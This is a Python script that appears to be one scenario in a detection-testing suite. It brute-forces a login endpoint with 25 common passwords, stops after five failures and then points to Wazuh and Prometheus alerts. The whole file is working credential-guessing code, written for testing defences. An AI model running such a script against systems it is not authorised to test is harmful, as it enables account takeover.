#!/usr/bin/env python3
"""
Scenario 8: Brute Force Login Attack
- Difficulty: Intermediate
- Detection: Wazuh, Web logs, authentication system
- Expected Alert: Multiple failed login attempts, account lockout
"""

import sys
import argparse
import logging
import requests
import time
from urllib.parse import urljoin

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class BruteForceScenario:
    def __init__(self, target, endpoint='/api/login', username='admin', verbose=False):
        self.target = target if target.startswith('http') else f"http://{target}"
        self.endpoint = endpoint
        self.username = username
        self.verbose = verbose
        self.attempts = 0
        self.successful = 0
        self.failed = 0
        self.results = {
            'scenario': 'BRUTE_FORCE_LOGIN',
            'target': target,
            'endpoint': endpoint,
            'username': username,
            'attempts': 0,
            'successful': 0,
            'failed': 0,
            'status': 'pending'
        }

    def create_password_list(self):
        """Common password list"""
        passwords = [
            'password', '123456', 'admin', 'letmein', 'welcome',
            'monkey', 'dragon', 'master', 'sunshine', 'princess',
            'qwerty', 'abc123', 'password123', 'admin123', 'root',
            'toor', 'test', 'test123', 'changeme', 'password1',
            '12345678', '111111', 'q1w2e3r4', 'pass', 'pass123'
        ]
        return passwords

    def attempt_login(self, username, password):
        """Attempt a single login"""
        try:
            data = {
                'username': username,
                'password': password
            }

            response = requests.post(
                urljoin(self.target, self.endpoint),
                data=data,
                timeout=5,
                verify=False,
                allow_redirects=False
            )

            # Check for successful login
            if response.status_code == 200 or 'success' in response.text.lower():
                return True, response.status_code
            else:
                return False, response.status_code

        except requests.exceptions.RequestException as e:
            if self.verbose:
                logger.warning(f"[-] Request error: {e}")
            return False, -1

    def launch_brute_force(self):
        """Launch brute force attack"""
        logger.info(f"[*] Starting Brute Force Attack against {self.target}{self.endpoint}")
        logger.info(f"[*] Target username: {self.username}")

        passwords = self.create_password_list()
        logger.info(f"[*] Testing {len(passwords)} passwords")

        start_time = time.time()

        try:
            for password in passwords:
                self.attempts += 1

                logger.info(f"[+] Attempt {self.attempts}: Testing password '{password}'")

                success, status_code = self.attempt_login(self.username, password)

                if success:
                    self.successful += 1
                    logger.warning(f"[!] SUCCESS: Valid credentials found! {self.username}:{password}")
                else:
                    self.failed += 1
                    if self.verbose:
                        logger.debug(f"[-] Failed - Status Code: {status_code}")

                # Rate limiting - realistic attack pattern
                time.sleep(0.5)

                # Simulate account lockout detection
                if self.failed >= 5:
                    logger.warning(f"[!] Account likely locked after {self.attempts} attempts")
                    break

        except KeyboardInterrupt:
            logger.info("\n[!] Brute force attack interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        elapsed = time.time() - start_time
        self.results['attempts'] = self.attempts
        self.results['successful'] = self.successful
        self.results['failed'] = self.failed
        self.results['duration'] = elapsed
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log brute force results"""
        logger.info("\n" + "="*60)
        logger.info("BRUTE FORCE LOGIN RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}{self.endpoint}")
        logger.info(f"Username: {self.username}")
        logger.info(f"Total Attempts: {self.attempts}")
        logger.info(f"Successful: {self.successful}")
        logger.info(f"Failed: {self.failed}")
        logger.info(f"Duration: {self.results.get('duration', 0):.2f}s")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - Wazuh: Search for 'failed login' pattern")
        logger.info("  - Application logs: Review authentication failures")
        logger.info("  - Prometheus: Monitor auth_failures_per_minute metric")
        logger.info("  - Check for account lockout trigger")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='Brute Force Login Attack Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 08_brute_force_login.py --target 10.10.10.10:8080 --username admin
  python 08_brute_force_login.py --target http://192.168.1.100 --username user --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target URL or IP:port')
    parser.add_argument('--endpoint', default='/api/login', help='Login endpoint')
    parser.add_argument('--username', default='admin', help='Username to attack')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Suppress SSL warnings
    requests.packages.urllib3.disable_warnings()

    scenario = BruteForceScenario(
        target=args.target,
        endpoint=args.endpoint,
        username=args.username,
        verbose=args.verbose
    )

    scenario.launch_brute_force()

if __name__ == '__main__':
    main()
